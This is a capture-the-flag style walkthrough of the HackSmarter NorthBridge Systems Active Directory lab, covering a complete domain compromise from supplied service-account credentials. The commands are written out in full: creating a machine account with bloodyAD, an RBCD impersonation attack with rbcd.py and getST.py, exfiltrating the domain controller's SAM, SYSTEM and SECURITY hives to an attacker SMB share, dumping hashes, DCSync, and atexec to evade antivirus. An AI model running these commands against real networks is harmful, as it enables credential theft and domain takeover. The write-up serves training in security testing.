---
title: "HackSmarter NorthBridge Systems Walkthrough  "
date: 2026-06-17 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/3e5b486e-3ea1-43f5-986d-97c18c018e17" />


## Objective/Scope : 

NorthBridge Systems is a managed service provider that has engaged the Hack Smarter Red Team to perform a security assessment against a portion of their environment. The assessment is to be conducted from an assumed breach perspective, as you have been provided credentials for a dedicated service account created specifically for this engagement.

Your point of contact at NorthBridge Systems has authorized testing on the following hosts. Any host outside this scope is considered out of scope and should not be accessed.

NORTHDC01 (Domain controller)
NORTHJMP01 (Jump box user by the IT team)
The primary objective of the security assessment is to compromise the domain controller (NORTHDC01) in order to demonstrate the effectiveness (or lack thereof) of the recent security hardening activities.

To track your progress in the assessment, there are flags located at C:\Users\Administrator\Desktop on each host.

As you progress through the environment, make sure to document these flags so your point of contact knows you have compromised the environment.

Your success in this assessment will directly inform their future cybersecurity budget! No pressure!


## Solution : 


### Initial Scans : 

We first start by scanning the Targets : 

<img width="1786" height="810" alt="image" src="https://github.com/user-attachments/assets/5208bd1b-41aa-4f5e-bc99-875c084714ed" />

Looking at the initial scans , Jump01 machine only has port 445 and RDP that can be useful to us , whereas DC01 , we find Kerberos , LDAP , DNS , all of these confirm that this is the DC and that it is an Active Directory Lab . 

Since this is an AD machine , i always like to keep this check list in mind : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now back to our scans , first thing we need to do is add Hostnames as well as the Domain name to our /etc/hosts file , we can use nxc for this one : 

<img width="1669" height="477" alt="image" src="https://github.com/user-attachments/assets/f4f4f67e-2519-4bc4-9a8d-fa9922631611" />

Now that everything is setup let's start enumerating each machine separately , starting with the Jump01 .

We're already given a set of creds we can use to enumerate the domain : 

```bash
_securitytestingsvc:4kCc$A@NZvNAdK@
```


### Jump01 : 

<img width="1356" height="603" alt="image" src="https://github.com/user-attachments/assets/bdf0c894-f679-4e2a-9bb6-a2ec81ec0e54" />

The user we're given isn't admin on the machine , but if we check the shares , we find the Network Shares that we are able to Read, let's login via smbclient and from there download all the files : 

<img width="1252" height="733" alt="image" src="https://github.com/user-attachments/assets/60a008a0-376a-488c-a971-9ab552bc1bef" />

If we check the files , we find this PS file , which is always interesting since scripts often has passwords inside of them . 

<img width="909" height="823" alt="image" src="https://github.com/user-attachments/assets/3b0d7836-aebb-4fe8-8292-459390f35e72" />

Nothing here : 

<img width="989" height="708" alt="image" src="https://github.com/user-attachments/assets/829f847d-e3c5-4789-9d74-189254365458" />

Checking the other files didn't return anything useful either . 

Let's just RDP to the machine since we know our user has the ability to RDP into the Jump box :

<img width="1468" height="548" alt="image" src="https://github.com/user-attachments/assets/6e8637c0-a6d8-4177-934e-2444e8a92795" />

Once inside we see a folder called scripts , where we find another folder called AD Backup , i first checked it to see if there were any passwords left in here : 

<img width="1657" height="608" alt="image" src="https://github.com/user-attachments/assets/14fa456c-3c15-4a9e-8a0d-4daca7539bc7" />

But nothing . We also have another folder we can check called Server Build Automation , maybe it has a password as well since it's used for automation. 

<img width="1334" height="745" alt="image" src="https://github.com/user-attachments/assets/a1e468ac-07f6-4c53-aa18-6e103e5fd114" />

Perfect we find the password for the automation service account . 

```bash
_svrautomationsvc :  yf0@EoWY4cXqmVv
```

<img width="1359" height="423" alt="image" src="https://github.com/user-attachments/assets/510c6086-3ddc-4466-a71c-d9c2d928a23c" />


### DC01 :

Moving on to the DC now , first i needed a list of users to Test for ASREPROASTING , from there i will check kerberoasting since we've got valid users already , i will check shares and finally if nothing works , we will check BloodHound . 

First let's generate the userlist : 

<img width="1904" height="580" alt="image" src="https://github.com/user-attachments/assets/3800df4c-cd86-4f6c-8849-0c912f2f7dd9" />

Then check for ASREPROASTING : 

<img width="1128" height="799" alt="image" src="https://github.com/user-attachments/assets/4df67bd1-0985-4d7b-a2a7-de228be6050b" />

Nothing , let's check for kerberoastable users : 

<img width="1349" height="255" alt="image" src="https://github.com/user-attachments/assets/7976b970-ee7f-4110-b0e8-b8e347fe9129" />

Nothing as well .

<img width="1192" height="377" alt="image" src="https://github.com/user-attachments/assets/dc70c711-d9d9-4268-a70e-36642016414a" />

Finally the shares available to us are only the default ones, so let's move to BloodHound : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'hellyr' -p 'H3lenaR!2025' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

<img width="1751" height="361" alt="image" src="https://github.com/user-attachments/assets/3c05e795-b2ae-43a1-9e3e-4e383f1e8c21" />

Now on Bloodhound , let's first add both users to Owned Objects and check if any of them has any Outbound Object Control . 

<img width="1523" height="486" alt="image" src="https://github.com/user-attachments/assets/5cca2d83-7614-47a8-bb36-59b6b3a104bc" />

We see that svc_automation has Write Account Restriction over the Jump01 computer . 

<img width="820" height="644" alt="image" src="https://github.com/user-attachments/assets/a4e51330-c19d-4157-99b8-7329867ef543" />

Looking at ways to abuse this Write acccount restrictions we see that we are able to modify the msDS-Allowed-To-Act-On-Behalf-Of-Other-Identity which will allow us to have a Resource-based constrained attack (RBCD) !

If we check for ways to abuse RBCD :

<img width="812" height="673" alt="image" src="https://github.com/user-attachments/assets/32ae969e-9fb2-4226-995f-080f99f0c589" />

So basically what this means : 

RBCD abuse: if an attacker controls write access to a target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, they can set it to an account they control (…RBCD abuse: if an attacker controls write access to a target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, they can set it to an account they control (often a created machine account), then use S4U2Self/S4U2Proxy from that account to obtain a service ticket impersonating any user on the target, usable via Pass-the-Ticket.

But for the attack to work we first need to create a machine account that we will be using , for this we can use BloodyAD , since each user on the domain has the possibility to add up to 10 machine accounts by default . 

<img width="1914" height="751" alt="image" src="https://github.com/user-attachments/assets/d039dcde-c0e9-432b-a853-18877704a183" />

We see that we get an error , saying that we exceeded the number of machines we can add . 

Looking at the Readme we found earlier : 

<img width="1510" height="556" alt="image" src="https://github.com/user-attachments/assets/3c4f4083-4a86-46ca-a244-54f5331faac3" />

It also mentions that we are able to create machine accounts inside the ¨Provisionning OU without worrying about exceeding the Quota . Now let's modify our command to specify which OU to add the machine account to: 

```bash
bloodyad --host 10.1.109.188 -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' add computer 'Fake_hh' 'WEAK.123' --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp'
```
<img width="1916" height="390" alt="image" src="https://github.com/user-attachments/assets/2f498611-3c36-4807-8354-edea38c4b343" />

Perfect now we can proceed with the RBCD attack . This article is the one i will be following : 

```bash
https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-resource-based-constrained
```

First we modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on JUMP01 so that we make our new machine account able to delegate on the Jump01's behalf .

```bash
rbcd.py -delegate-from 'Fake_hh$' -delegate-to 'NORTHJMP01$' -dc-ip '10.1.109.188' -action 'write' 'northbridge.corp'/'_svrautomationsvc':'yf0@EoWY4cXqmVv'
```

<img width="1673" height="431" alt="image" src="https://github.com/user-attachments/assets/c4a8befc-705d-40c3-a847-a0e3bb5e0df9" />

Now we can request a TGT for any user we want to access the Jump01 machine , if we check Bloodhound :

<img width="1573" height="687" alt="image" src="https://github.com/user-attachments/assets/55b14b1d-3f60-4188-8c57-b49f69c6d903" />

I first tried impersonating the admin user ERHODESTO who is domain admin  , but apparently he is protected against Delegation attacks -_-

<img width="1233" height="500" alt="image" src="https://github.com/user-attachments/assets/d8f6df2d-c150-40e9-9023-7713e2d123f8" />

We also find this group which is not a default one , and if we look at LDAP findings we see in the description that all members of this Group can add users to the Local Admin group on Jump01 .

So let's impersonate one of these users : 

```bash
getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate GCOOKT1 'northbridge.corp/Fake_hh$:WEAK.123' -dc-ip 10.1.109.188
```

<img width="1396" height="402" alt="image" src="https://github.com/user-attachments/assets/d54c2fdd-1cfb-4356-946c-bee6fb4c148d" />

Nice now that we've got the Ticket , we can check if we can authenticate to this machine : 

<img width="1378" height="446" alt="image" src="https://github.com/user-attachments/assets/ae77b3e0-94f1-492f-841c-69175a4a5b71" />

Nevermind , our current user isn't part of the local admin group on the Jump01 machine , let's impersonate someone else :

I found out that MEEL is an admin on the machine , let's use her instead : 

```bash
getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate MLEET1  'northbridge.corp/Fake_hh$:WEAK.123' -dc-ip 10.1.109.188
export KRB5CCNAME=MLEET1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccache
nxc smb NORTHJMP01.northbridge.corp -u MLEET1 -k --use-kcache
```

<img width="1783" height="643" alt="image" src="https://github.com/user-attachments/assets/5f48f578-445b-403a-b469-7d1130600cc2" />

Perfect , now that we have a local admin user , we can use it to dump Hashes :

<img width="1525" height="753" alt="image" src="https://github.com/user-attachments/assets/35147087-1de8-4b6e-bde2-a44de60c458f" />

I dumped SAM , LSASS , and finally DPAPI creds , we were able to find the DCC2 hash for the Backup_svc user but by dumping the dpapi creds , we were able to extract the plain text password so no need to crack the DCC2

<img width="1920" height="374" alt="image" src="https://github.com/user-attachments/assets/35dd028f-3e7e-486b-bdc4-fb401a90e0de" />

Let's verify it using nxc : 

<img width="1315" height="547" alt="image" src="https://github.com/user-attachments/assets/28703d40-8a8d-4a64-8323-0e956df9c19c" />

We are able to RDP to the Jump01 but we're not admin so we can't get the user's flag , anyways we can try to use MLEET1 to access the Admin share using smbclient . 

<img width="1187" height="818" alt="image" src="https://github.com/user-attachments/assets/d31ca6a2-859d-4045-9966-f998e160c484" />

From there we get the user flag : 

<img width="1012" height="510" alt="image" src="https://github.com/user-attachments/assets/abe784a0-841e-48d4-9800-89ff53c9d89f" />

Now back to our Backup user if we check Bloodhound : 

<img width="1364" height="581" alt="image" src="https://github.com/user-attachments/assets/056b97f0-6b46-4d0f-b7f8-f977913d8c92" />

We see that he is part of the Backup Operator's group , which means , we can use this to dump the SAM DB on the DC01 machine . 

Although we can't login to the machine , we can use the fact that we're part of the backup operator's group to dump SAM Hives remotely and use secretsdump locally to extract the Hashes . 

<img width="839" height="744" alt="image" src="https://github.com/user-attachments/assets/b5702f67-38f0-4f2b-927c-deba647e0749" />

To exploit this : 

<img width="840" height="780" alt="image" src="https://github.com/user-attachments/assets/688fa231-d6d6-4b6c-bb53-ff118f6075e6" />

I will be following this guide from Hacker Reciepe : 

```bash
==> First we Host the SMB server on our Kali :
smbserver.py -smb2support Shareee .

==> Then we Exfiltrate the HIVES :
reg.py northbridge.corp/_backupsvc:'j0$QyPZ0JWzN2*iu^5'@NORTHDC01 save -keyName 'HKLM\SAM'  -o '\\10.200.65.94\Shareee'
reg.py northbridge.corp/_backupsvc:'j0$QyPZ0JWzN2*iu^5'@NORTHDC01 save -keyName 'HKLM\SYSTEM'  -o '\\10.200.65.94\Shareee'
reg.py northbridge.corp/_backupsvc:'j0$QyPZ0JWzN2*iu^5'@NORTHDC01 save -keyName 'HKLM\SECURITY'  -o '\\10.200.65.94\Shareee'
```

<img width="1920" height="736" alt="image" src="https://github.com/user-attachments/assets/2e83f5b5-ddff-4aac-9dc1-a1375f12572e" />

Once we import all the Hives locally we can use secretsdump to dump the SAM Hashes . 

Reg.py didn't work for me , i couldn't make it work , so used nxc module -M Backup_Operator :

```bash
nxc smb NORTHDC01 -u '_backupsvc' -p 'j0$QyPZ0JWzN2*iu^5' -M backup_operator
```

<img width="1660" height="734" alt="image" src="https://github.com/user-attachments/assets/bc20f06d-da38-45e2-902e-22a354f5d46c" />

Perfect , we have the Hash for the DC01$ which is the machine account , this can be used to perform a DCSYNC and dump the NTDS . The SAM We dumped contained an admin Hash but that is not the Domain Admin's hash , since that one is stored in the NTDS , SAM only holds local account hashes , luckily for us we were able to dump the machines acc for the DC and perform a DCSync that way :) 

Now let's dump the NTDS : 

<img width="1649" height="754" alt="image" src="https://github.com/user-attachments/assets/503a051d-bc26-44fc-a1e0-f7d7c59f2aac" />

From here we can validate our creds and login via smbclient to get the flag , since the DC doesn't have Winrm enabled . 

Before that let's attempt to read it using nxc : 

<img width="1513" height="589" alt="image" src="https://github.com/user-attachments/assets/48abd7cf-23b4-4967-9134-8c2b1b3fbe02" />

It gets blocked by the AV , we can either use WMIexec2 or use atexec as both will attempt to bypass the AV , let's use atexec which will create a task that will execute our command : 

<img width="1729" height="474" alt="image" src="https://github.com/user-attachments/assets/2f9ea251-57d5-45bf-971e-3701b8344ae7" />

Perfect we got our Root Flag :)

That was all for this Lab. See you in the Next One :)


